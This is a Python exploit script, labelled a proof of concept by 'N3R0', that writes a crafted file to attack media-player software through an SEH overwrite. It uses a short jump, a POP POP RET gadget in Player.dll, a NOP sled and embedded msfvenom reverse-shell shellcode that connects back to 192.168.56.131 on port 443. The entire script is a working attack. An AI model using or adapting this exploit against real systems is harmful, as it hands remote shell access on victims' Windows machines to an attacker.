#!/usr/bin/env python3

import sys
# After 264 bytes we reach SEH and we can overwrite it
# After 260 bytes we reach Next-SEH and we can overwrite it
# Bad chars = \x00\x0a\x0d\x20
# Msfvenom payload:
# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.56.131 LPORT=443 -f c -b '\x00\x0a\x0d\x20'

shellcode = (
"\xba\xe6\xaa\x24\x1f\xdb\xc7\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x83\xee\xfc\x31\x56\x0e\x03\xb0\xa4\xc6\xea\xc0\x51\x84"
"\x15\x38\xa2\xe9\x9c\xdd\x93\x29\xfa\x96\x84\x99\x88\xfa\x28"
"\x51\xdc\xee\xbb\x17\xc9\x01\x0b\x9d\x2f\x2c\x8c\x8e\x0c\x2f"
"\x0e\xcd\x40\x8f\x2f\x1e\x95\xce\x68\x43\x54\x82\x21\x0f\xcb"
"\x32\x45\x45\xd0\xb9\x15\x4b\x50\x5e\xed\x6a\x71\xf1\x65\x35"
"\x51\xf0\xaa\x4d\xd8\xea\xaf\x68\x92\x81\x04\x06\x25\x43\x55"
"\xe7\x8a\xaa\x59\x1a\xd2\xeb\x5e\xc5\xa1\x05\x9d\x78\xb2\xd2"
"\xdf\xa6\x37\xc0\x78\x2c\xef\x2c\x78\xe1\x76\xa7\x76\x4e\xfc"
"\xef\x9a\x51\xd1\x84\xa7\xda\xd4\x4a\x2e\x98\xf2\x4e\x6a\x7a"
"\x9a\xd7\xd6\x2d\xa3\x07\xb9\x92\x01\x4c\x54\xc6\x3b\x0f\x31"
"\x2b\x76\xaf\xc1\x23\x01\xdc\xf3\xec\xb9\x4a\xb8\x65\x64\x8d"
"\xbf\x5f\xd0\x01\x3e\x60\x21\x08\x85\x34\x71\x22\x2c\x35\x1a"
"\xb2\xd1\xe0\x8d\xe2\x7d\x5b\x6e\x52\x3e\x0b\x06\xb8\xb1\x74"
"\x36\xc3\x1b\x1d\xdd\x3e\xcc\xe2\x8a\x78\x8f\x8b\xc8\x78\x8e"
"\xf0\x44\x9e\xfa\x16\x01\x09\x93\x8f\x08\xc1\x02\x4f\x87\xac"
"\x05\xdb\x24\x51\xcb\x2c\x40\x41\xbc\xdc\x1f\x3b\x6b\xe2\xb5"
"\x53\xf7\x71\x52\xa3\x7e\x6a\xcd\xf4\xd7\x5c\x04\x90\xc5\xc7"
"\xbe\x86\x17\x91\xf9\x02\xcc\x62\x07\x8b\x81\xdf\x23\x9b\x5f"
"\xdf\x6f\xcf\x0f\xb6\x39\xb9\xe9\x60\x88\x13\xa0\xdf\x42\xf3"
"\x35\x2c\x55\x85\x39\x79\x23\x69\x8b\xd4\x72\x96\x24\xb1\x72"
"\xef\x58\x21\x7c\x3a\xd9\x41\x9f\xee\x14\xea\x06\x7b\x95\x77"
"\xb9\x56\xda\x81\x3a\x52\xa3\x75\x22\x17\xa6\x32\xe4\xc4\xda"
"\x2b\x81\xea\x49\x4b\x80")

buf = "\x41" * 260
nseh = "\xeb\x06\x90\x90" # JMP 6 bytes to our NOP sled
seh = "\x6f\x12\x01\x10" # POP EDI POP ESI RETN (1001126F) found in Player.dll module
nop = "\x90" * 20
padding = "\x90" * 1180

exploit = buf + nseh + seh + nop + shellcode + padding

file = open(sys.argv[1],'ab')
print("-------------------------------------------------------------\n")
print("\t Proof Of Concept (PoC) by N3R0 \n")
print("-------------------------------------------------------------\n")
print("Generated file is [%d] bytes long\n\n" % len(exploit))
file.write(bytes(exploit,'latin-1'))
file.close()
